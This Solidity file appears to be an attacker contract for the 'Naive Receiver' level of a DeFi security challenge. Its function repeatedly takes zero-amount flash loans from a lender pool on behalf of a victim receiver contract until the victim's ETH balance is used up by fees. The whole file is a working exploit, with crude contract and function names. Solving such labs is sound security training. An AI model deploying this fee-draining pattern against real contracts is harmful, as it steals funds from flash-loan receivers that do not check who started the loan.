// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import {console} from "hardhat/console.sol";

contract FuckNaiveReceiver {
    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    function fuckYou(address naive) public {
        // console.log(NaiveReceiverLenderPool(payable(pool)).flashFee(ETH, 0));
        // console.log(naive.balance);
        while (
            naive.balance >=
            NaiveReceiverLenderPool(payable(pool)).flashFee(ETH, 0)
        ) {
            IERC3156FlashLender(pool).flashLoan(
                IERC3156FlashBorrower(naive),
                ETH,
                0,
                "0x"
            );
        }
    }
}
